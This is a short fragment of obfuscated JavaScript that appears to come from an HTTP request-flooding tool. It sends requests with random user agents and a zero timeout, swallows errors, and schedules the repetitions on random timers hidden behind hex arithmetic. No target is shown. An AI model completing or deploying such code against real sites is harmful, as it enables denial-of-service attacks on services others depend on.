      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x3085 * 0x1 + 0x2297 + 0x2946) * getRandomInt(0x37d * -0x7 + 0x244d * -0x1 + 0x3cb9, 0x1a87 + 0xc1a + 0x1c * -0x161));
}, 0x97 * 0xa + 0x713 * -0x5 + 0x1ddd);